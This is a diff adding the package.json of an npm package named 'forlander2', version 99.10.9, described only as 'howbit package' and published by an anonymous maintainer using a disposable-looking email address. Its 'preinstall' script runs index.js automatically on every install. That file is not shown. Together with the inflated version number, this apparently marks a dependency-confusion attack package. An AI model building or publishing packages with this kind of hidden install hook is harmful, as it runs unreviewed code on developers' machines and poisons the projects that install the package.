@@ -1,0 +1,39 @@
+{
+    "name": "forlander2",
+    "version": "99.10.9",
+    "description": "howbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "forlander2@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-BiCDVdk+AvM1Aavr2Eq5CsgKvEhQdUcwnZo9ttkaAjPZN//eW4a3MExm9RgsSftriqgrGFO1V+dHNyqbVGAbPg==",
+        "shasum": "4375716e61580cfd9825e833f4270c70cdb689c3",
+        "tarball": "https://registry.npmjs.org/forlander2/-/forlander2-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 6709,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQa4GACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqZ+A/+PvA4kgaJRU3I9DayklodyLwuOpv5oiFtNV9JNveIwFPT1H7+\r\n97r8xrm1FlQTkSMb+XQRxUZoL+on9ip8lon1n6FaR19zPysP7uFE+R1+81HR\r\nKwHH62JQ7UCn/E+STohMqkXS0XjELVRhwC4cA34EXCkbr9GYgCxqghyE0hKY\r\nKCvIe4LUvblnq+vS8FC4c3mITCgPlhBozmSAMS6a6nU8AUjp1HRKzH0hwp/Q\r\ncXvxKXssh9qRpIekU6mPRCwdnJOwOMaOpUluLs0wkyWI5WJY5GbhFGzA6Yv3\r\nW7j2upp6omWbnkK1krlIHVaDWmvUi2jAumJnBQ/Fr7lcGT8S1ft/F5ISzyZG\r\nJ14NgXaextlSjFeL8ktuEL+AllhgRRAiJZHymLk+iZbskiXR0quNefCNq8Z9\r\ny+lzD+rS33lLMCJ+STmmW0D14O93U+zgJzzEySf6oWcikgaLh9kLmNUSYNQe\r\n8Af6IF5DKVcRqKOm4RRDMXsrN7ib9hrJHjcW43dAVVnMsbSk/JObAbUUGrxL\r\nFVuFPzS2xzjCrj4bQeGePWJMOs/s1Knh5B26WeclrOjUcFQMbOfmynmQ93wL\r\npkscTvCrshLzR/pSNHP5T/PfOZtqIKrC/SXpd0NBdhFWMth2sA5Cwds0+tiH\r\nkzQc0+tfgtAvW43hQ9D5WYUEFgGx4Z48PiM=\r\n=XO8g\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "438w0936",
+        "email": "438w0936@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "438w0936",
+            "email": "438w0936@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/forlander2_99.10.9_1648471558725_0.0882578516057182"
+    },
+    "_hasShrinkwrap": false
+}
